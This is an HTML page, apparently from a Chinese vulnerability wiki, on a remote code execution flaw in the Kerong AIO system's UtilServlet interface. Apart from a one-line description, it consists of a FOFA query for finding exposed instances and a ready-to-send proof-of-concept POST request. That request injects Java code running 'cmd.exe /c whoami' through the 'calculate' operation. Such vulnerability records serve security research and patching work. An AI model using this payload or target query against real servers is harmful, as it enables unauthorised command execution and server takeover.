@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A7%91%E8%8D%A3AIO/%E7%A7%91%E8%8D%A3AIO%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3UtilServlet%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>科荣AIO系统接口UtilServlet存在代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u79d1\u8363AIO\u7cfb\u7edf\u63a5\u53e3UtilServlet\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣 AIO 管理系统 ReportServlet 存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FendTime%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FendTime%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣AIO管理系统endTime参数存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="aioutilservlet">科荣AIO系统接口UtilServlet存在代码执行漏洞<a class="headerlink" href="#aioutilservlet" title="Permanent link">&para;</a></h1>
+<p>科荣AIO UtilServlet 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">body</span><span class="o">=</span><span class="s2">&quot;changeAccount(&#39;8000&#39;)&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">UtilServlet</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="mf">127.0.0.1</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">6.1</span><span class="p">;</span><span class="w"> </span><span class="nx">WOW64</span><span class="p">)</span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">534.57.2</span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="nx">Version</span><span class="o">/</span><span class="mf">5.1.7</span><span class="nx">Safari</span><span class="o">/</span><span class="mf">534.57.2</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">keep</span><span class="o">-</span><span class="nx">alive</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="mf">322</span>
+
+<span class="nx">operation</span><span class="o">=</span><span class="nx">calculate</span><span class="o">&amp;</span><span class="nx">value</span><span class="o">=</span><span class="nx">BufferedReader</span><span class="o">+</span><span class="nx">br</span><span class="o">+%</span><span class="mf">3</span><span class="nx">d</span><span class="o">+</span><span class="ow">new</span><span class="o">+</span><span class="nx">BufferedReader</span><span class="p">(</span><span class="ow">new</span><span class="o">+</span><span class="nx">InputStreamReader</span><span class="p">(</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">().</span><span class="nx">exec</span><span class="p">(</span><span class="s2">&quot;cmd.exe+/c+whoami&quot;</span><span class="p">).</span><span class="nx">getInputStream</span><span class="p">()))</span><span class="o">%</span><span class="mf">3</span><span class="nx">bString</span><span class="o">+</span><span class="nx">line</span><span class="o">%</span><span class="mf">3</span><span class="nx">bStringBuilder</span><span class="o">+</span><span class="nx">b</span><span class="o">+%</span><span class="mf">3</span><span class="nx">d</span><span class="o">+</span><span class="ow">new</span><span class="o">+</span><span class="nx">StringBuilder</span><span class="p">()</span><span class="o">%</span><span class="mf">3</span><span class="nx">bwhile</span><span class="o">+</span><span class="p">((</span><span class="nx">line</span><span class="o">+%</span><span class="mf">3</span><span class="nx">d</span><span class="o">+</span><span class="nx">br</span><span class="p">.</span><span class="nx">readLine</span><span class="p">())</span><span class="o">+!%</span><span class="mf">3</span><span class="nx">d</span><span class="o">+</span><span class="kc">null</span><span class="p">)</span><span class="o">+</span><span class="p">{</span><span class="nx">b</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span><span class="o">%</span><span class="mf">3</span><span class="nx">b</span><span class="p">}</span><span class="k">return</span><span class="o">+</span><span class="ow">new</span><span class="o">+</span><span class="nb">String</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span><span class="o">%</span><span class="mf">3</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">fieldName</span><span class="o">=</span><span class="nx">example_field</span>
+</code></pre></div>
+<p><img alt="920396433c98be57376c249f469ae450" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409111012822.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣 AIO 管理系统 ReportServlet 存在任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FendTime%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FendTime%E5%8F%82%E6%95%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣AIO管理系统endTime参数存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
